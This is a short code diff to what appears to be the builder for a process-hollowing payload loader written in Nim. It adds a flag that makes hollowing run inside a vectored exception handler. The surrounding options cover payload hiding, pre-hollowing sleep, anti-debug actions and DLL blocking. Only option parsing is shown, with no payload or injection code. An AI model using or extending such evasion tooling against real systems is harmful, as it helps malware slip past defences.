@@ -64,6 +64,7 @@ var isBlockDlls: bool
 var isSplit: bool
 var sleepSeconds: string
 var antiDebugg: string
+var isVeh: bool
 var isDebug: bool
 
 # Define compiler args
@@ -102,6 +103,7 @@ when isMainModule:
         flag("-p", "--split", help="Split and hide the payload blob in hollower (takes long to compile!)")
         option("-t", "--sleep", help="Number of seconds to sleep before hollowing", default=some("0"))
         option("-g", "--anti-debug", help="Action to perform upon debugger detection", choices = @["none", "die", "troll"], default=some("none"))
+        flag("-v", "--veh", help="Hollow will occur within VEH")
         flag("-d", "--debug", help="Compile as debug instead of release (loader is verbose)")
     # Parse arguments
     try:
@@ -119,6 +121,7 @@ when isMainModule:
         isSplit = opts.split
         sleepSeconds = opts.sleep
         antiDebugg = opts.anti_debug
+        isVeh = opts.veh
         isDebug = opts.debug
     except ShortCircuit as err:
         if err.flag == "argparse_help":
@@ -168,6 +171,7 @@ var dllExportName* = protectString("{outDllExportName}")
 var isBlockDlls* = {isBlockDlls}
 var antiDebugAction* = protectString("{antiDebugg}")
 var sleepSeconds* = {sleepSeconds}
+var isVeh* = {isVeh}
     """
     writeFile(paramsPath, paramsToHollower)
 
